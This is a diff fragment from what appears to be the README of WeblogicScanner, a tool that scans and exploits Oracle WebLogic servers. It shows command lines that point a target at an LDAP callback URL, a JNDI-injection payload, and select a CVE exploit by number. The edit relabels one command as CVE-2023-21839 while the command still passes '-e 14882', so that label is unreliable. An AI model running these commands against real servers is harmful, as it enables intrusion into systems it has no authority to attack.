@@ -67,7 +67,7 @@ WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval
 
 + EXP单个利用，指定EXP末尾数字即可
 ```go
-//CVE-2020-14882
+//CVE-2023-21839
 WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval -e 14882
 
 //cve-2020-2883
